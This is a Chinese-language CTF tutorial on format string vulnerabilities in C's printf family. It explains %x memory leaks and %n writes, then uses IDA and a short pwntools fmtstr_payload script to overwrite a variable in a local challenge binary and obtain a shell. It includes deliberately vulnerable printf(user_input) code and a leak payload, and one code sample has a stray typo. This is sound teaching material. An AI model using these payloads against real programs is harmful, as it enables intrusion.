  

格式化字符串漏洞是`PWN`题常见的考察点，仅次于栈溢出漏洞。漏洞原因：程序使用了格式化字符串作为参数，并且格式化字符串为用户可控。其中触发格式化字符串漏洞函数主要是`printf`、`sprintf`、`fprintf`、`prin`等C库中`print`家族的函数

### 0x01 格式化字符串介绍

    
    
    printf（"格式化字符串",参数...)
    

该`printf`函数的第一个参数是由格式化说明符与字符串组成，用来规定参数用什么格式输出内容。

格式化说明符：

    
    
    %d - 十进制 - 输出十进制整数
    %s - 字符串 - 从内存中读取字符串
    %x - 十六进制 - 输出十六进制数
    %c - 字符 - 输出字符
    %p - 指针 - 指针地址
    %n - 到目前为止所写的字符数
    

例如：

    
    
    #include <stdio.h>
    int main(void){
        printf("My name is %s","Ezreal");
        return 0;
    }
    

调用以后会显示：

    
    
    My name is Ezreal
    

特别要注意的是`%n`这个格式化字符串，它的功能是将`%n`之前打印出来的字符个数，赋值给一个变量。例如：

    
    
    #include <stdio.h>
    
    int main(void)
    {
        int c = 0; 
        printf("the use of %n", &c);sss
        printf("%d\n", c);
        return 0;
    }
    

调用以后会显示：

    
    
    the use of 11
    

### 0x02 漏洞形成原因

1、函数用法：

正常的`printf`用法：

    
    
    #include <stdio.h>
    int main()
    {
      char str[100];
      scanf("%s",str);
      printf("%s",str);
      return 0;
    }
    

写程序时要规定字符串的格式化说明符，规定参数的输出类型

错误的`printf`写法：

    
    
    #include <stdio.h>
    int main()
    {
      char str[100];
      scanf("%s",str);
      printf(str);
      return 0;
    }
    

漏洞形成原因：程序将格式化字符串的输入权交给用户，printf函数并不知道参数个数，它的内部有个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。所以没有参数，代码也会将format
string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。示例程序：

    
    
    #include <stdio.h>
    
    int main(void)
    {
        char a[100];
        scanf("%s",a);
        printf(a);
        return 0;
    }
    

假设我们的输入为:

    
    
    AAAA%x,%x,%x,%x,%x,%x,%x,%x,%x,%x,%x
    

程序的输出为：

    
    
    AAAA61fe4c,61ffcc,76e4d250,70734fbf,fffffffe,76e473da,41414141,252c7825,78252c78,2c78252c,252c7825
    

成功打印出地址

### 0x03 解题步骤

  

![步骤.webp.jpg](https://image.3001.net/images/20190702/1562057156_5d1b19c4b721a.jpg!small)

##### 1 、逆向工程：

将PWN题拖入IDA，点击程序入口函数。按F5逆向main函数，查看对应的C伪代码。

找到关键代码：

![关键.webp.jpg](https://image.3001.net/images/20190702/1562058216_5d1b1de801405.jpg!small)![](./images/1558524048596.png)

##### 2 、分析代码：

方法一：直接分析源码主函数`main`使用了`printf`函数并使用了格式化字符串

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      char s; // [esp+1Ch] [ebp-8Ch]
      unsigned int v5; // [esp+9Ch] [ebp-Ch]
    
      v5 = __readgsdword(0x14u);
      memset(&s, 0, 0x80u);
      fgets(&s, 128, stdin);
      printf(&s);
      if ( secret == 192 )
        give_shell();
      else
        printf("Sorry, secret = %d\n", secret);
      return 0;
    }
    

方法二：使用漏洞检测插件推荐一个简单IDA插件[LazyIDA](https://github.com/L4ys/LazyIDA)，将它放在IDA路径下的plugins目录。这时可以用IDA打开题目，右击就可以看到一个`Scan
format string vulnerabilities`查询格式化字符串漏洞。

![漏洞.webp.jpg](https://image.3001.net/images/20190702/1562058322_5d1b1e5251ae9.jpg!small)

  

查询到漏洞：

![查询.webp.jpg](https://image.3001.net/images/20190702/1562058340_5d1b1e6423255.jpg!small)  

总结：找到格式化字符串漏洞，发现关键代码如下：

    
    
      if ( secret == 192 )
        give_shell();
      else
    

思路：当`secret`值为 `192`执行`give_shell()`函数，即利格式化字符串漏洞将`secret`值改为 `192`就能拿到shell

### 0x04 漏洞利用

用IDA查看secret地址为`0x0804A048`：

![](./images/1561445942694.png)

查找格式化字符串距离：

![](./images/1561447779523.png)

编写利用脚本如下：

    
    
    from pwn import *
    io = process('./format')
    payload = fmtstr_payload(11,{0x0804A048:0xC0})
    io.sendline(payload)
    io.interactive()
    

成功拿到shell：

![she.webp.jpg](https://image.3001.net/images/20190702/1562058493_5d1b1efd0b024.jpg!small)  
![qrcode_for_gh_223e082fe8a7_430.jpg](https://image.3001.net/images/20190702/1562058504_5d1b1f0824a00.jpg!small)![](./images/1561368916287.png)

